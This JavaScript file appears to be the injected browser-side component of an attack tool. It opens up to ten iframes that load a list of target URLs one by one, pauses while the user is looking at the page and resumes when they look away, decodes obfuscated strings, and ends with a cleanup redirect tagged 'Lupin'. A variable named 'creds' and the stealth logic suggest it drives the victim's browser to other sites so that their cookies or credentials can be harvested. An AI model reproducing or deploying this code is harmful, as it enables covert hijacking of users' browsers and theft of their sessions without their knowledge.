var creds = "";
var check = 0;
var finishedSlaves = 0;	
var numSlaves = 1;
var pause;
var targetIndexArray;
var chunkLenArray;

           
function deobfs(string)
{
	var nums = string.split(".")
        var deobfs = "";
	var k;
           
        for (i=0; i<nums.length; i+=1)
	{
        	k = parseInt(nums[i])-255;
                deobfs+=String.fromCharCode(k);
        }
	return deobfs;
}


function moveSrc(slaveFrameNum)
{
	var slaveFrameName = "slaveFrame"+slaveFrameNum.toString();
        var slaveFrame= document.getElementsByName(slaveFrameName)[0]; 
	var src = targets[targetIndexArray[slaveFrameNum]];


	targetIndexArray[slaveFrameNum] +=numSlaves;	
	//d = deobfs(src)
	chunkLenArray[slaveFrameNum]-= 1;
        slaveFrame.setAttribute('src', src );
	return 1;
}


function createSlaveFrame(slaveFrameNum)
{ 
	var slaveFrame = document.createElement("IFRAME"); 
        slaveFrame.setAttribute("height", "100");
        slaveFrame.setAttribute("width", "100");
        slaveFrame.setAttribute("id", "slaveFrame"+slaveFrameNum.toString());
        slaveFrame.setAttribute("name", "slaveFrame"+slaveFrameNum.toString());
      	document.body.appendChild(slaveFrame); 
	

} 


function advanceSlaves()
{
	if(pause == true )
	{
		return;
	}
	
	check=0;
	for(var i=0; i<numSlaves;i++)
	{
		if(chunkLenArray[i] > 0)
		{
			if(limitRefresh == -1){
				moveSrc(i);
			}else
			{		
				if (check >=0 && check < limitRefresh)
				{		
					check+=1;
					moveSrc(i);
									
				}else
				{
					check = -1;
					continue;
				}
			}
		}	
			
	}

	
	if (sleepInterval > 0){
		setTimeout("advanceSlaves()",sleepInterval);
	}
}

       
           
function onMessage (event)
{

	var m = event.data;
	if(m.indexOf("focus") != -1)
	{
		pause = true;
		return;
	}else if(m.indexOf("blur") != -1)
	{
		pause = false;
		advanceSlaves();
		return;
	}

	var slaveFrameName = m;
        var slaveFrameNum = parseInt(slaveFrameName.substring(10));

	if(limitRefresh == -1){
		if(chunkLenArray[slaveFrameNum] > 0)
		{
			if (pause == false)
			{
				moveSrc(slaveFrameNum);
			}
		}
	}else
	{
		if(check >= 0 && check < limitRefresh)
		{
			if(chunkLenArray[slaveFrameNum] > 0)
			{
				if (pause == false)
				{
					moveSrc(slaveFrameNum);
					check+=1;
				}
			}
		}else
		{
			check = -1;
		}
	}

        if(chunkLenArray[slaveFrameNum] == 0)
	{
	        finishedSlaves+=1;
        }
  	
	if(finishedSlaves == numSlaves)
	{
		src = "http://"+document.location.hostname+"?sendCleanUp_Lupin=1";
		document.location.replace(src);      
	}  
	

}   	




function init()
{

	if(targets.length > 10)
	{
		numSlaves = 10;
	}

	targetIndexArray = new Array(numSlaves);
	chunkLenArray = new Array(numSlaves);

	var chunkLen = Math.floor(targets.length / numSlaves);
	var rem = targets.length - numSlaves*chunkLen;

       	for(var i=0; i<numSlaves;i++)
	{
       		targetIndexArray[i] = i;

		chunkLenArray[i] = chunkLen;
		if(i<rem)
		{
			chunkLenArray[i] +=1;

    		}
       	}
	
	for(var i=0;i<numSlaves;i+=1)
	{
                createSlaveFrame(i);
      	}

	window.addEventListener ("message", onMessage, false);
	

}




